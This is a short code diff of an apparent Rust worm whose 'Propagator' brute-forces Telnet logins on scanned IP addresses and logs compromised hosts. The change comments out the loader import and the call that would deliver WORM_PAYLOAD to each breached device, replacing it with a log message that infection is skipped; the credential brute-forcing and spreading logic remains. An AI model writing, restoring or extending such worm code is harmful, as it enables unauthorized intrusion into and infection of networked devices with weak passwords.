@@ -1,6 +1,6 @@
 mod modules;
 use std::time::Duration;
-use ::loader::loader;
+// use ::loader::loader;
 use log::{info, error};
 
 // Remote Downloader Payload
@@ -41,7 +41,8 @@ async fn main() {
                          if let Some((u, p)) = modules::bruteforce::run_bruteforce(&t_ip, 23).await {
                              info!("+ [Propagator] Pwned Telnet: {}", t_ip);
                              // Payload Delivery
-                             let _ = loader::infect_target(&format!("{}:23", t_ip), &u, &p, WORM_PAYLOAD).await;
+                             // let _ = loader::infect_target(&format!("{}:23", t_ip), &u, &p, WORM_PAYLOAD).await;
+                             info!("! [loader] removed. Infection skipped for {}", t_ip);
                          }
                     }
                     
